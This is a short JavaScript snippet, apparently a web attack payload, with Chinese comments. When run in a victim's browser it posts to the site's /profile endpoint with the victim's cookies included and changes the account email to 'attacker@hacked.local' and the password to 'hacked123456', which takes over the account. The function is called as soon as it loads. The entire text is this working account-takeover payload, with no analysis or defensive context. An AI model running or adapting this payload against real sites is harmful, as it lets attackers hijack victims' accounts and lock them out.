async function takeOverAccount(){
    const formData = new FormData();
    // 修改受害者邮箱 + 修改受害者密码，实现账号接管
    formData.append("email", "attacker@hacked.local");
    formData.append("password", "hacked123456");

    // POST请求提交给 /profile 修改个人资料，携带受害者本地cookie
    await fetch("/profile",{
        method:"POST",
        body: formData,
        credentials:"include"
    });
}
takeOverAccount();
